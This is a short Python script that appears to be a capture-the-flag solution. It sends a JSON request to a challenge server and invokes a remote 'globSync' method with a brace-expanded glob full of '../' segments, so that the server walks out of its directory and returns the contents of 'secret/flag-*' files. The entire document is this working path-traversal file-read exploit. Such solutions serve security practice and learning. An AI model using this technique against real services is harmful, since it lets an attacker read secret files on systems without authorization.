import requests

target = "https://kitty1-719fda.chal.zip/"

print(requests.post(target, json={
    "method":"globSync",
    "args": ["{../,a}/{../,a}/{../,a}/{../,a}/secret/flag-*"]
}).text)
